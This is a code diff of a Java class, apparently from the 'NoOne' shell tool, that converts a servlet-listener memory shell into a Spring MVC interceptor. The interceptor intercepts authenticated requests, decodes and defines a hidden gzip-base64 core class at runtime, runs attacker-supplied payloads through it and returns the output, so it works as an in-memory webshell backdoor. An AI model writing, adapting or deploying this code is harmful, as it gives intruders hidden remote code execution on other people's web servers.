@@ -1,67 +1,63 @@
 package com.reajason.noone.core.shelltool;
 
+import org.springframework.web.servlet.AsyncHandlerInterceptor;
+import org.springframework.web.servlet.ModelAndView;
+
 import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequestEvent;
-import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
- * @since 2025/8/29
+ * @since 2024/12/22
  */
-public class NoOneListener extends ClassLoader implements ServletRequestListener {
-
-    private static Class<?> coreClass = null;
+public class NoOneStagelessInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
+    private static volatile Class<?> coreClass = null;
     private static String coreGzipBase64;
 
-    public NoOneListener() {
+    public NoOneStagelessInterceptor() {
     }
 
-    public NoOneListener(ClassLoader parent) {
-        super(parent);
-    }
-
-
-    @Override
-    public void requestDestroyed(ServletRequestEvent sre) {
-
+    public NoOneStagelessInterceptor(ClassLoader c) {
+        super(c);
     }
 
     @Override
-    public void requestInitialized(ServletRequestEvent sre) {
-        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         try {
+            // stageless
             if (isAuthed(request)) {
+                ServletOutputStream responseOutputStream = response.getOutputStream();
                 try {
-                    HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
-                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     if (coreClass == null) {
-                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
-                        coreClass = new NoOneListener(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
+                        synchronized (NoOneStagelessInterceptor.class) {
+                            if (coreClass == null) {
+                                byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
+                                coreClass = new NoOneStagelessInterceptor(Thread.currentThread().getContextClassLoader())
+                                        .defineClass(bytes, 0, bytes.length);
+                            }
+                        }
                     }
-                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     Object httpChannelCore = coreClass.newInstance();
+                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    httpChannelCore.equals(new Object[]{request, response});
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    ServletOutputStream responseOutputStream = response.getOutputStream();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     responseOutputStream.write(data);
-                    wrapResponse(response);
-                    responseOutputStream.flush();
-                    responseOutputStream.close();
-                } catch (Throwable ignored) {
+                } catch (Exception e) {
+                    responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
                 }
+                wrapResponse(response);
+                responseOutputStream.flush();
+                responseOutputStream.close();
+                return false;
             }
         } catch (Throwable ignored) {
         }
-    }
-
-    private Object getResponseFromRequest(Object request) throws Exception {
-        return null;
+        return true;
     }
 
     private boolean isAuthed(Object request) {
@@ -118,5 +114,27 @@ public class NoOneListener extends ClassLoader implements ServletRequestListener
             }
             out.close();
         }
+    }
+
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
+    }
+
+    @Override
+    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+
+    }
+
+    @Override
+    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
+
+    }
+
+    @Override
+    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
+
     }
 }
